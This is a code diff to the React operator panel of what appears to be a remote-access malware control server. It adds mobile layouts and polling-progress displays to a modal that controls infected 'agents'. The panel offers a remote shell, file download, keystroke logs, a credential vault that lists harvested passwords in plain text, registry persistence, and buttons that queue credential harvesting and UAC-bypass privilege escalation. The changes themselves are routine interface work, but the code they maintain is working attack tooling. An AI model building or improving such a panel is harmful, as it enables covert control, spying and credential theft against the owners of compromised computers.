@@ -21,13 +21,15 @@ const timeSince = (d) => {
 };
 
 /** Send a task and poll for its result. Returns parsed output or null on timeout. */
-async function sendAndPoll(agentId, taskType, args, onResult, timeoutMs = 60000) {
+async function sendAndPoll(agentId, taskType, args, onResult, onProgress, timeoutMs = 60000) {
   try {
     const res = await api.createTask(agentId, taskType, args);
     const taskId = res.id;
     const maxAttempts = Math.ceil(timeoutMs / 2000);
     for (let i = 0; i < maxAttempts; i++) {
       await new Promise(r => setTimeout(r, 2000));
+      const elapsed = (i + 1) * 2;
+      if (onProgress) onProgress(elapsed, timeoutMs / 1000);
       const results = await api.getAgentResults(agentId);
       const result = results.find(r => r.task_id === taskId);
       if (result) {
@@ -116,22 +118,33 @@ function Toast({ msg }) {
 /* ========== MAIN MODAL ========== */
 
 const TABS = [
-  { key: 'terminal', label: '⌘ Terminal' },
-  { key: 'files', label: '📁 Files' },
-  { key: 'processes', label: '⚙ Processes' },
-  { key: 'display', label: '🖥 Display' },
-  { key: 'keylog', label: '⌨ Input Log' },
-  { key: 'vault', label: '🔑 Vault' },
-  { key: 'registry', label: '🗂 Registry' },
-  { key: 'persistence', label: '📌 Persistence' },
-  { key: 'network', label: '🌐 Network' },
-  { key: 'settings', label: '⚙ Settings' },
+  { key: 'terminal', icon: '⌘', label: 'Terminal' },
+  { key: 'files', icon: '📁', label: 'Files' },
+  { key: 'processes', icon: '⚙', label: 'Processes' },
+  { key: 'display', icon: '🖥', label: 'Display' },
+  { key: 'keylog', icon: '⌨', label: 'Input Log' },
+  { key: 'vault', icon: '🔑', label: 'Vault' },
+  { key: 'registry', icon: '🗂', label: 'Registry' },
+  { key: 'persistence', icon: '📌', label: 'Persistence' },
+  { key: 'network', icon: '🌐', label: 'Network' },
+  { key: 'settings', icon: '⚙', label: 'Settings' },
 ];
+
+function useIsMobile() {
+  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
+  useEffect(() => {
+    const handler = () => setIsMobile(window.innerWidth < 768);
+    window.addEventListener('resize', handler);
+    return () => window.removeEventListener('resize', handler);
+  }, []);
+  return isMobile;
+}
 
 export default function AgentModal({ agent, onClose }) {
   const [tab, setTab] = useState('terminal');
   const [creds, setCreds] = useState([]);
   const [toastMsg, showToast] = useToast();
+  const isMobile = useIsMobile();
 
   useEffect(() => {
     api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
@@ -143,12 +156,13 @@ export default function AgentModal({ agent, onClose }) {
     <Modal onClose={onClose}>
       {/* HEADER */}
       <div style={{
-        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-        padding: '10px 16px', background: '#1f2228', borderBottom: '1px solid var(--border)', flexShrink: 0,
+        display: 'flex', alignItems: isMobile ? 'flex-start' : 'center', justifyContent: 'space-between',
+        padding: isMobile ? '8px 10px' : '10px 16px', background: '#1f2228', borderBottom: '1px solid var(--border)', flexShrink: 0,
+        flexDirection: isMobile ? 'column' : 'row', gap: isMobile ? 6 : 0,
       }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: 12, fontSize: 12, fontFamily: 'var(--font-mono)' }}>
-          <span style={{ width: 8, height: 8, background: statusColor, display: 'inline-block', animation: agent.status === 'active' ? 'pulse 2s infinite' : 'none' }} />
-          <span style={{ fontSize: 16 }}>{countryFlag(agent.country)}</span>
+        <div style={{ display: 'flex', alignItems: 'center', gap: isMobile ? 6 : 12, fontSize: isMobile ? 11 : 12, fontFamily: 'var(--font-mono)', flexWrap: isMobile ? 'wrap' : 'nowrap' }}>
+          <span style={{ width: 8, height: 8, background: statusColor, display: 'inline-block', animation: agent.status === 'active' ? 'pulse 2s infinite' : 'none', flexShrink: 0 }} />
+          <span style={{ fontSize: isMobile ? 14 : 16 }}>{countryFlag(agent.country)}</span>
           <span style={{ fontWeight: 600 }}>{agent.hostname || agent.id?.substring(0, 10).toUpperCase()}</span>
           <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
           <span style={{ color: 'rgba(255,255,255,0.5)' }}>USER</span>
@@ -156,30 +170,32 @@ export default function AgentModal({ agent, onClose }) {
           <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
           <span style={{ color: 'rgba(255,255,255,0.5)' }}>OS</span>
           <span>{agent.os || '-'}</span>
-          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
-          <span style={{ color: 'rgba(255,255,255,0.5)' }}>IP</span>
-          <span>{agent.ip_internal || '-'}</span>
-          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
-          <span style={{ color: 'rgba(255,255,255,0.5)' }}>EXT</span>
-          <span>{agent.ip_external || '-'}</span>
-          {agent.isp && <>
+          {!isMobile && <>
             <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
-            <span style={{ color: 'rgba(255,255,255,0.5)' }}>ISP</span>
-            <span>{agent.isp}</span>
+            <span style={{ color: 'rgba(255,255,255,0.5)' }}>IP</span>
+            <span>{agent.ip_internal || '-'}</span>
+            <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+            <span style={{ color: 'rgba(255,255,255,0.5)' }}>EXT</span>
+            <span>{agent.ip_external || '-'}</span>
+            {agent.isp && <>
+              <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
+              <span style={{ color: 'rgba(255,255,255,0.5)' }}>ISP</span>
+              <span>{agent.isp}</span>
+            </>}
           </>}
           <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
           <span style={{ color: 'rgba(255,255,255,0.5)' }}>LAST</span>
           <span style={{ color: statusColor }}>{timeSince(agent.last_seen)}</span>
         </div>
-        <div style={{ display: 'flex', gap: 6 }}>
-          <HeaderBtn label="⬜ Screenshot" onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
-          <HeaderBtn label="⚷ Harvest" cls="harvest" onClick={() => { api.createTask(agent.id, 'vault_reader', {}); showToast('🔑 Harvesting credentials...'); }} />
-          <HeaderBtn label="↑ Escalate" cls="escalate" onClick={() => { api.createTask(agent.id, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }} />
-          <HeaderBtn label="✕ Kill" cls="kill" onClick={() => { api.createTask(agent.id, 'cleanup', {}); showToast('☠ Agent terminated'); }} />
+        <div style={{ display: 'flex', gap: isMobile ? 4 : 6, flexShrink: 0 }}>
+          <HeaderBtn label={isMobile ? '📸' : '⬜ Screenshot'} onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
+          <HeaderBtn label={isMobile ? '⚷' : '⚷ Harvest'} cls="harvest" onClick={() => { api.createTask(agent.id, 'vault_reader', {}); showToast('🔑 Harvesting credentials...'); }} />
+          <HeaderBtn label={isMobile ? '↑' : '↑ Escalate'} cls="escalate" onClick={() => { api.createTask(agent.id, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }} />
+          <HeaderBtn label={isMobile ? '✕' : '✕ Kill'} cls="kill" onClick={() => { api.createTask(agent.id, 'cleanup', {}); showToast('☠ Agent terminated'); }} />
           <button onClick={onClose} style={{
             background: 'none', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.5)',
             fontSize: 16, width: 30, height: 30, display: 'flex', alignItems: 'center', justifyContent: 'center',
-            cursor: 'pointer', marginLeft: 10, fontFamily: 'var(--font-mono)',
+            cursor: 'pointer', marginLeft: isMobile ? 4 : 10, fontFamily: 'var(--font-mono)', minWidth: 30, minHeight: 30,
           }}>✕</button>
         </div>
       </div>
@@ -187,28 +203,30 @@ export default function AgentModal({ agent, onClose }) {
       {/* TAB BAR */}
       <div style={{
         display: 'flex', borderBottom: '1px solid var(--border)', background: '#1f2228',
-        flexShrink: 0, overflowX: 'auto',
-      }}>
+        flexShrink: 0, overflowX: 'auto', WebkitOverflowScrolling: 'touch',
+        scrollbarWidth: 'none', msOverflowStyle: 'none',
+      }} className="agent-modal-tabs">
         {TABS.map(t => (
           <div key={t.key} onClick={() => setTab(t.key)} style={{
-            padding: '9px 16px', fontSize: 11, cursor: 'pointer',
+            padding: isMobile ? '8px 10px' : '9px 16px', fontSize: isMobile ? 9 : 11, cursor: 'pointer',
             borderBottom: tab === t.key ? '2px solid var(--green)' : '2px solid transparent',
             color: tab === t.key ? 'var(--green)' : 'rgba(255,255,255,0.5)',
             whiteSpace: 'nowrap', textTransform: 'uppercase', letterSpacing: 0.5,
             fontFamily: 'var(--font-mono)', transition: 'all .15s',
-          }}>{t.label}</div>
+            minHeight: 44, display: 'flex', alignItems: 'center',
+          }}>{isMobile ? t.label : `${t.icon} ${t.label}`}</div>
         ))}
       </div>
 
       {/* TAB CONTENT */}
       <div style={{ flex: 1, overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
         {tab === 'terminal' && <TerminalTab agent={agent} showToast={showToast} />}
-        {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} />}
-        {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
+        {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
         {tab === 'display' && <DisplayTab agentId={agent.id} showToast={showToast} />}
         {tab === 'keylog' && <InputLogTab agentId={agent.id} showToast={showToast} />}
-        {tab === 'vault' && <VaultTab creds={creds} agentId={agent.id} showToast={showToast} />}
-        {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'vault' && <VaultTab creds={creds} agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
+        {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
         {tab === 'persistence' && <PersistenceTab agentId={agent.id} showToast={showToast} />}
         {tab === 'network' && <NetworkTab agentId={agent.id} showToast={showToast} />}
         {tab === 'settings' && <SettingsTab agentId={agent.id} agent={agent} showToast={showToast} />}
@@ -260,6 +278,7 @@ function TerminalTab({ agent, showToast }) {
   const [shell, setShell] = useState('cmd');
   const [cmdHistory, setCmdHistory] = useState([]);
   const [historyIdx, setHistoryIdx] = useState(-1);
+  const [pollInfo, setPollInfo] = useState(null);
   const termRef = useRef(null);
   const inputRef = useRef(null);
 
@@ -270,6 +289,7 @@ function TerminalTab({ agent, showToast }) {
     setHistoryIdx(-1);
     setInput('');
     setWorking(true);
+    setPollInfo(null);
 
     sendAndPoll(agent.id, 'terminal', { cmd }, (result) => {
       if (result !== null) {
@@ -278,6 +298,9 @@ function TerminalTab({ agent, showToast }) {
         setHistory(prev => [...prev, { type: 'error', text: 'Timeout: no response from agent' }]);
       }
       setWorking(false);
+      setPollInfo(null);
+    }, (elapsed, total) => {
+      setPollInfo({ elapsed, total });
     });
   };
 
@@ -331,7 +354,10 @@ function TerminalTab({ agent, showToast }) {
               {entry.type === 'error' && <span style={{ color: 'var(--red)' }}>{entry.text}</span>}
             </div>
           ))}
-          {working && <div style={{ color: 'var(--yellow)' }}>⏳ executing...</div>}
+          {working && <div style={{ color: 'var(--yellow)' }}>
+            ⏳ executing...{pollInfo && <span style={{ marginLeft: 8, fontSize: 10 }}> Waiting for agent... {pollInfo.elapsed}s / {pollInfo.total}s</span>}
+            {pollInfo && pollInfo.elapsed >= 30 && <div style={{ fontSize: 10, color: 'rgba(255,170,0,0.7)', marginTop: 2 }}>Agent may be slow to respond. Still waiting...</div>}
+          </div>}
         </div>
         <div style={{ display: 'flex', alignItems: 'center', padding: '0 12px 12px 12px', background: '#0a0c10', gap: 0 }}>
           <span style={{ color: 'var(--green)', fontSize: 12, whiteSpace: 'pre', fontFamily: 'var(--font-mono)' }}>{prompt}</span>
@@ -348,23 +374,31 @@ function TerminalTab({ agent, showToast }) {
 }
 
 /* ========== FILES TAB (Split Panel) ========== */
-function FilesTab({ agentId, showToast }) {
-  const [path, setPath] = useState(['C:']);
+function FilesTab({ agentId, showToast, isMobile }) {
+  const [path, setPath] = useState(['C:\\']);
   const [files, setFiles] = useState([]);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
   const [ctx, setCtx] = useState(null);
   const [selectedFile, setSelectedFile] = useState(null);
+  const [pollProgress, setPollProgress] = useState(null);
 
-  const currentPath = path.join('\\');
+  const buildPath = (segments) => {
+    if (segments.length === 1 && segments[0].endsWith('\\')) return segments[0];
+    return segments.join('\\');
+  };
+
+  const currentPath = buildPath(path);
 
   const loadFiles = (targetPath) => {
     const p = targetPath || currentPath;
     setLoading(true);
     setError(null);
     setFiles([]);
+    setPollProgress(null);
     sendAndPoll(agentId, 'storage_list', { path: p }, (result) => {
       setLoading(false);
+      setPollProgress(null);
       if (result && Array.isArray(result)) {
         result.sort((a, b) => {
           if (a.is_dir && !b.is_dir) return -1;
@@ -377,27 +411,29 @@ function FilesTab({ agentId, showToast }) {
       } else {
         setError('Timeout: no response from agent');
       }
+    }, (elapsed, total) => {
+      setPollProgress({ elapsed, total });
     });
   };
 
   const navigateTo = (folder) => {
     const newPath = [...path, folder];
     setPath(newPath);
-    loadFiles(newPath.join('\\'));
+    loadFiles(buildPath(newPath));
   };
 
   const navigateUp = () => {
     if (path.length > 1) {
       const newPath = path.slice(0, -1);
       setPath(newPath);
-      loadFiles(newPath.join('\\'));
+      loadFiles(buildPath(newPath));
     }
   };
 
   const navigateBreadcrumb = (index) => {
     const newPath = path.slice(0, index + 1);
     setPath(newPath);
-    loadFiles(newPath.join('\\'));
+    loadFiles(buildPath(newPath));
   };
 
   const formatSize = (bytes) => {
@@ -423,15 +459,16 @@ function FilesTab({ agentId, showToast }) {
   return (
     <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
       <div style={S.toolbar}>
-        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => showToast('📤 Upload not implemented yet')}>↑ Upload</button>
-        <button style={S.toolBtn} onClick={() => showToast('📁 New folder not implemented yet')}>+ New Folder</button>
-        <button style={S.toolBtn} onClick={() => loadFiles()} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => showToast('📤 Upload not implemented yet')}>{isMobile ? '↑' : '↑ Upload'}</button>
+        <button style={S.toolBtn} onClick={() => showToast('📁 New folder not implemented yet')}>{isMobile ? '+' : '+ New Folder'}</button>
+        <button style={S.toolBtn} onClick={() => loadFiles()} disabled={loading}>{loading ? '⏳...' : isMobile ? '↻' : '↻ Refresh'}</button>
         <div style={{ flex: 1 }} />
       </div>
       {/* Breadcrumb */}
       <div style={{
         display: 'flex', alignItems: 'center', gap: 4, padding: '8px 12px',
         borderBottom: '1px solid var(--border)', fontSize: 12, background: '#1f2228', fontFamily: 'var(--font-mono)',
+        flexWrap: 'wrap',
       }}>
         {path.map((p, i) => (
           <React.Fragment key={i}>
@@ -445,39 +482,45 @@ function FilesTab({ agentId, showToast }) {
       </div>
       {/* Split panel */}
       <div style={S.splitPanel}>
-        <div style={S.splitLeft}>
-          <div style={{ padding: 8 }}>
-            <div style={{ color: 'rgba(255,255,255,0.5)', fontSize: 10, textTransform: 'uppercase', marginBottom: 8, fontFamily: 'var(--font-mono)' }}>Folder Tree</div>
-            <div onClick={navigateUp} style={{ padding: '4px 8px', cursor: path.length > 1 ? 'pointer' : 'default', color: path.length > 1 ? 'var(--green)' : 'rgba(255,255,255,0.3)', fontSize: 12, fontFamily: 'var(--font-mono)' }}>
-              📁 ..
-            </div>
-            {files.filter(f => f.is_dir).map((f, i) => (
-              <div key={i} onClick={() => navigateTo(f.name)} style={{
-                padding: '4px 8px', cursor: 'pointer', color: '#61afef', fontSize: 12, fontFamily: 'var(--font-mono)',
-              }} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}
-                 onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
-                📁 {f.name}
+        {!isMobile && (
+          <div style={S.splitLeft}>
+            <div style={{ padding: 8 }}>
+              <div style={{ color: 'rgba(255,255,255,0.5)', fontSize: 10, textTransform: 'uppercase', marginBottom: 8, fontFamily: 'var(--font-mono)' }}>Folder Tree</div>
+              <div onClick={navigateUp} style={{ padding: '4px 8px', cursor: path.length > 1 ? 'pointer' : 'default', color: path.length > 1 ? 'var(--green)' : 'rgba(255,255,255,0.3)', fontSize: 12, fontFamily: 'var(--font-mono)' }}>
+                📁 ..
               </div>
-            ))}
+              {files.filter(f => f.is_dir).map((f, i) => (
+                <div key={i} onClick={() => navigateTo(f.name)} style={{
+                  padding: '4px 8px', cursor: 'pointer', color: '#61afef', fontSize: 12, fontFamily: 'var(--font-mono)',
+                }} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}
+                   onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
+                  📁 {f.name}
+                </div>
+              ))}
+            </div>
           </div>
-        </div>
+        )}
         <div style={S.splitRight}>
           {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: 12 }}>Error: {error}</div>}
-          <div style={{ flex: 1, overflowY: 'auto' }}>
+          <div style={{ flex: 1, overflowY: 'auto', overflowX: isMobile ? 'auto' : 'hidden' }}>
             <table style={{ width: '100%', borderCollapse: 'collapse' }}>
               <thead><tr>
                 <th style={{ ...S.th, width: 24 }}></th>
                 <th style={S.th}>Name</th>
-                <th style={S.th}>Size</th>
-                <th style={S.th}>Modified</th>
-                <th style={{ ...S.th, width: 70 }}>Actions</th>
+                {!isMobile && <th style={S.th}>Size</th>}
+                {!isMobile && <th style={S.th}>Modified</th>}
+                <th style={{ ...S.th, width: 70 }}>{isMobile ? '' : 'Actions'}</th>
               </tr></thead>
               <tbody>
                 {files.length === 0 && !loading && (
-                  <tr><td colSpan={5} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>Click Refresh to browse filesystem</td></tr>
+                  <tr><td colSpan={isMobile ? 3 : 5} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>Click Refresh to browse filesystem</td></tr>
                 )}
                 {loading && (
-                  <tr><td colSpan={5} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Waiting for agent response...</td></tr>
+                  <tr><td colSpan={isMobile ? 3 : 5} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>
+                    ⏳ Waiting for agent response...
+                    {pollProgress && <span style={{ marginLeft: 8, fontSize: 10 }}>{pollProgress.elapsed}s / {pollProgress.total}s</span>}
+                    {pollProgress && pollProgress.elapsed >= 30 && <div style={{ fontSize: 10, color: 'rgba(255,170,0,0.7)', marginTop: 4 }}>Agent may be slow to respond. Still waiting...</div>}
+                  </td></tr>
                 )}
                 {files.map((f, i) => (
                   <tr key={i} style={{ cursor: 'pointer' }}
@@ -487,10 +530,10 @@ function FilesTab({ agentId, showToast }) {
                     onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                     <td style={S.td}>{f.is_dir ? '📁' : '📄'}</td>
                     <td style={{ ...S.td, color: f.is_dir ? '#61afef' : '#fff' }}>{f.name}</td>
-                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{f.is_dir ? '-' : formatSize(f.size)}</td>
-                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{formatDate(f.modified)}</td>
+                    {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{f.is_dir ? '-' : formatSize(f.size)}</td>}
+                    {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{formatDate(f.modified)}</td>}
                     <td style={S.td}>
-                      {!f.is_dir && <button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10 }}
+                      {!f.is_dir && <button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10, minHeight: 44, minWidth: 44 }}
                         onClick={e => { e.stopPropagation(); api.createTask(agentId, 'storage_upload', { path: currentPath + '\\' + f.name }); showToast('⬇ Downloading'); }}>⬇</button>}
                     </td>
                   </tr>
@@ -506,7 +549,7 @@ function FilesTab({ agentId, showToast }) {
 }
 
 /* ========== PROCESSES TAB ========== */
-function ProcessesTab({ agentId, showToast }) {
+function ProcessesTab({ agentId, showToast, isMobile }) {
   const [processes, setProcesses] = useState([]);
   const [loading, setLoading] = useState(false);
   const [search, setSearch] = useState('');
@@ -596,7 +639,7 @@ function ProcessesTab({ agentId, showToast }) {
           setSelectedProcs(new Set());
         }} disabled={selectedProcs.size === 0}>Kill Selected</button>
       </div>
-      <div style={{ flex: 1, overflowY: 'auto' }}>
+      <div style={{ flex: 1, overflowY: 'auto', overflowX: isMobile ? 'auto' : 'hidden' }}>
         <table style={{ width: '100%', borderCollapse: 'collapse' }}>
           <thead><tr>
             <th style={{ ...S.th, width: 30 }}><input type="checkbox" style={{ accentColor: 'var(--green)' }}
@@ -606,13 +649,14 @@ function ProcessesTab({ agentId, showToast }) {
               }} /></th>
             <th style={S.th} onClick={() => handleSort('pid')}>PID{sortArrow('pid')}</th>
             <th style={S.th} onClick={() => handleSort('name')}>Name{sortArrow('name')}</th>
-            <th style={S.th} onClick={() => handleSort('user')}>User{sortArrow('user')}</th>
-            <th style={S.th} onClick={() => handleSort('memory_mb')}>Memory{sortArrow('memory_mb')}</th>
-            <th style={S.th} onClick={() => handleSort('threads')}>Threads{sortArrow('threads')}</th>
+            {!isMobile && <th style={S.th} onClick={() => handleSort('user')}>User{sortArrow('user')}</th>}
+            {!isMobile && <th style={S.th} onClick={() => handleSort('memory_mb')}>Memory{sortArrow('memory_mb')}</th>}
+            {!isMobile && <th style={S.th} onClick={() => handleSort('threads')}>Threads{sortArrow('threads')}</th>}
+            {isMobile && <th style={{ ...S.th, width: 44 }}>Kill</th>}
           </tr></thead>
           <tbody>
             {loading && processes.length === 0 && (
-              <tr><td colSpan={6} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Waiting for agent response...</td></tr>
+              <tr><td colSpan={isMobile ? 4 : 6} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Waiting for agent response...</td></tr>
             )}
             {sorted.map((p, i) => (
               <tr key={i}
@@ -629,11 +673,12 @@ function ProcessesTab({ agentId, showToast }) {
                   }} /></td>
                 <td style={{ ...S.td, color: 'var(--green)' }}>{p.pid}</td>
                 <td style={S.td}>{p.name}</td>
-                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.user || '-'}</td>
-                <td style={{ ...S.td, color: (p.memory_mb || 0) > 200 ? 'var(--yellow)' : 'rgba(255,255,255,0.7)' }}>
+                {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.user || '-'}</td>}
+                {!isMobile && <td style={{ ...S.td, color: (p.memory_mb || 0) > 200 ? 'var(--yellow)' : 'rgba(255,255,255,0.7)' }}>
                   {p.memory_mb != null ? p.memory_mb.toFixed ? p.memory_mb.toFixed(1) + ' MB' : p.memory_mb + ' MB' : '-'}
-                </td>
-                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.threads || p.parent_pid || '-'}</td>
+                </td>}
+                {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{p.threads || p.parent_pid || '-'}</td>}
+                {isMobile && <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 6px', fontSize: 10, minHeight: 44 }} onClick={() => setKillTarget(p)}>☠</button></td>}
               </tr>
             ))}
           </tbody>
@@ -714,7 +759,7 @@ function InputLogTab({ agentId, showToast }) {
 }
 
 /* ========== VAULT TAB ========== */
-function VaultTab({ creds, agentId, showToast }) {
+function VaultTab({ creds, agentId, showToast, isMobile }) {
   const [filter, setFilter] = useState('all');
   const [ctx, setCtx] = useState(null);
   const filtered = filter === 'all' ? creds : creds.filter(c => c.source?.toLowerCase() === filter);
@@ -753,26 +798,26 @@ function VaultTab({ creds, agentId, showToast }) {
         <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={harvest}>⚷ Harvest Now</button>
         <button style={S.toolBtn} onClick={() => showToast('📋 Exported CSV')}>↓ Export CSV</button>
       </div>
-      <div style={{ flex: 1, overflowY: 'auto' }}>
+      <div style={{ flex: 1, overflowY: 'auto', overflowX: isMobile ? 'auto' : 'hidden' }}>
         <table style={{ width: '100%', borderCollapse: 'collapse' }}>
           <thead><tr>
-            <th style={S.th}>Source</th><th style={S.th}>URL / Name</th><th style={S.th}>Username</th>
-            <th style={S.th}>Password</th><th style={S.th}>Harvested</th><th style={{ ...S.th, width: 60 }}></th>
+            <th style={S.th}>Source</th>{!isMobile && <th style={S.th}>URL / Name</th>}<th style={S.th}>Username</th>
+            <th style={S.th}>Password</th>{!isMobile && <th style={S.th}>Harvested</th>}<th style={{ ...S.th, width: 60 }}></th>
           </tr></thead>
           <tbody>
             {filtered.length === 0 ? (
-              <tr><td colSpan={6} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No credentials. Click Harvest Now.</td></tr>
+              <tr><td colSpan={isMobile ? 4 : 6} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No credentials. Click Harvest Now.</td></tr>
             ) : filtered.map((c, i) => (
               <tr key={c.id || i}
                 onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: credCtxItems(c) }); }}
                 onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
                 onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                 <td style={S.td}><span style={S.tag(srcColor(c.source))}>{c.source}</span></td>
-                <td style={{ ...S.td, color: '#61afef', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.url}</td>
+                {!isMobile && <td style={{ ...S.td, color: '#61afef', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.url}</td>}
                 <td style={S.td}>{c.username}</td>
-                <td style={{ ...S.td, color: 'var(--green)', fontWeight: 500 }}>{c.password}</td>
-                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>
-                <td style={S.td}><button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10 }}
+                <td style={{ ...S.td, color: 'var(--green)', fontWeight: 500, maxWidth: isMobile ? 100 : 'none', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.password}</td>
+                {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>}
+                <td style={S.td}><button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10, minHeight: 44 }}
                   onClick={() => copy(c.password)}>Copy</button></td>
               </tr>
             ))}
@@ -785,7 +830,7 @@ function VaultTab({ creds, agentId, showToast }) {
 }
 
 /* ========== REGISTRY TAB (Split Panel) ========== */
-function RegistryTab({ agentId, showToast }) {
+function RegistryTab({ agentId, showToast, isMobile }) {
   const [hive, setHive] = useState('HKCU');
   const [regPath, setRegPath] = useState('Software\\Microsoft\\Windows\\CurrentVersion\\Run');
   const [pathInput, setPathInput] = useState('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run');
@@ -874,9 +919,10 @@ function RegistryTab({ agentId, showToast }) {
         </button>
       </div>
       <div style={S.splitPanel}>
-        <div style={S.splitLeft}>
-          <div style={{ padding: 4 }}>
-            {hives.map(h => (
+        {!isMobile && (
+          <div style={S.splitLeft}>
+            <div style={{ padding: 4 }}>
+              {hives.map(h => (
               <div key={h.short}>
                 <div onClick={() => browseKey(h.short)} style={{
                   padding: '4px 8px', cursor: 'pointer', fontSize: 12, fontFamily: 'var(--font-mono)',
@@ -899,6 +945,7 @@ function RegistryTab({ agentId, showToast }) {
             ))}
           </div>
         </div>
+        )}
         <div style={S.splitRight}>
           {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: 12 }}>Error: {error}</div>}
           <div style={{ padding: '8px 12px', fontSize: 10, color: 'rgba(255,255,255,0.5)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', borderBottom: '1px solid var(--border)' }}>
